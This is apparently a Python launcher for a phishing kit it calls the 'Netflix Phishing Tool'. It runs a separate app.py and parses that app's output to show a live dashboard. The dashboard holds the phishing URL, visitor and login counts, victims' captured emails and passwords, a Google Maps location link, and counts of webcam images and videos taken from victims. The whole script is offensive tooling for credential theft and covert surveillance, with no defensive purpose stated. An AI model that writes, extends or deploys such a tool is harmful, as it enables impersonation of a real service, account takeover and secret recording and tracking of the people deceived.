import os
import subprocess
import sys
import time
import glob
from datetime import datetime
import re
import io
import threading

# ANSI color codes
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Global variables to store information
visitors_count = 0
logins_count = 0
server_url = ""
maps_url = ""
last_email = ""
last_password = ""
captured_images = 0
captured_videos = 0
running = True

def clear_screen():
    """Clear the terminal screen based on OS"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print the Netflix phishing tool banner in red color"""
    banner = f"""{RED}{BOLD}
░▒▓███████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░    ░▒▓█▓▒░   ░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
{RESET}"""
    return banner

def count_webcam_images():
    """Count the number of webcam images captured"""
    images_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'upload', 'images')
    images = glob.glob(os.path.join(images_dir, 'webcam_image_*.jpg'))
    return len(images)

def count_webcam_videos():
    """Count the number of webcam videos captured"""
    videos_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'upload', 'videos')
    videos = glob.glob(os.path.join(videos_dir, 'webcam_recording_*.webm'))
    return len(videos)

def update_display():
    """Update the display with the latest information"""
    global captured_images, captured_videos, server_url
    
    while running:
        clear_screen()
        
        # Get updated counts
        captured_images = count_webcam_images()
        captured_videos = count_webcam_videos()
        
        # Print banner
        print(print_banner())
        
        # Print server URL at the top
        if server_url:
            print(f"\n{BLUE}{BOLD}┌───────────────────────────────────────────────────────────────┐{RESET}")
            print(f"{BLUE}{BOLD}│{RESET} {YELLOW}Netflix Phishing URL:{RESET} {GREEN}{server_url}{RESET}")
            print(f"{BLUE}{BOLD}└───────────────────────────────────────────────────────────────┘{RESET}")
        
        # Print statistics under URL
        print(f"\n{CYAN}● Captured Images:{RESET} {WHITE}{captured_images}{RESET}")
        print(f"{CYAN}● Captured Videos:{RESET} {WHITE}{captured_videos}{RESET}")
        
        # Print visitor and login counts
        print(f"\n{MAGENTA}● Visitors:{RESET} {WHITE}{visitors_count}{RESET}   {MAGENTA}● Logins:{RESET} {WHITE}{logins_count}{RESET}")
        
        # Print last login info if available
        if last_email or last_password:
            print(f"\n{YELLOW}{BOLD}Last Login Information:{RESET}")
            if last_email:
                print(f"{GREEN}● Email:{RESET} {WHITE}{last_email}{RESET}")
            if last_password:
                print(f"{GREEN}● Password:{RESET} {WHITE}{last_password}{RESET}")
        
        # Print location if available
        if maps_url:
            print(f"\n{YELLOW}{BOLD}Location:{RESET}")
            print(f"{GREEN}● Maps URL:{RESET} {WHITE}{maps_url}{RESET}")
        
        # Print bottom info bar
        print(f"\n{BLUE}{BOLD}┌───────────────────────────────────────────────────────────────┐{RESET}")
        print(f"{BLUE}{BOLD}│{RESET} {RED}Netflix Phishing Tool{RESET} {BLUE}|{RESET} {YELLOW}Press Ctrl+C to exit{RESET}")
        print(f"{BLUE}{BOLD}└───────────────────────────────────────────────────────────────┘{RESET}")
        
        # Wait before updating again
        time.sleep(2)

def run_netflix_app():
    """Run the Netflix phishing application and capture its output"""
    global server_url, maps_url, last_email, last_password, visitors_count, logins_count, running
    
    try:
        # Fix console encoding for Windows
        if os.name == 'nt':
            # Enable UTF-8 mode for Windows console
            os.system('chcp 65001 > nul')
            # Set environment variable to use UTF-8
            os.environ["PYTHONIOENCODING"] = "utf-8"
        
        # Path to the app.py file
        netflix_app_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'app.py')
        
        if not os.path.exists(netflix_app_path):
            print(f"Error: Could not find app.py at {netflix_app_path}")
            print("Make sure you're running this launcher from the correct directory.")
            return
        
        # Set up environment variables for UTF-8 and unbuffered output
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        env["PYTHONUNBUFFERED"] = "1"
        
        # Run the app and capture its output
        process = subprocess.Popen([sys.executable, netflix_app_path], 
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT,
                                  universal_newlines=True,
                                  bufsize=1,
                                  env=env)
        
        # Process the output in real-time but don't print directly
        for line in iter(process.stdout.readline, ''):
            # Extract server URL
            if "* Running on" in line and not server_url:
                urls = re.findall(r'http://[^\s]+', line)
                if urls:
                    for url in urls:
                        if '127.0.0.1' not in url and 'localhost' not in url:
                            server_url = url
                            break
                    if not server_url and urls:
                        server_url = urls[0]
            
            # Detect new visitors
            if "New visitor detected" in line:
                visitors_count += 1
            
            # Capture login credentials
            if "passwd =" in line:
                last_password = line.split("passwd =")[-1].strip()
            
            elif "email =" in line:
                last_email = line.split("email =")[-1].strip()
            
            # Detect login attempts
            elif "Login attempt" in line or "New login detected" in line or "login detected" in line:
                logins_count += 1
            
            # Capture Google Maps URL
            elif "Google Maps URL:" in line:
                maps_url = line.split("Google Maps URL:")[-1].strip()
        
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\nError: {str(e)}")
    finally:
        running = False
        if 'process' in locals() and process:
            try:
                process.terminate()
            except:
                pass

if __name__ == "__main__":
    # Start the display update thread
    display_thread = threading.Thread(target=update_display)
    display_thread.daemon = True
    display_thread.start()
    
    try:
        # Run the Netflix app in the main thread
        run_netflix_app()
    except KeyboardInterrupt:
        print("\nExiting...")
    finally:
        running = False
        time.sleep(1)  # Give display thread time to finish
        clear_screen()
        print("Netflix Phishing Tool has been stopped.") 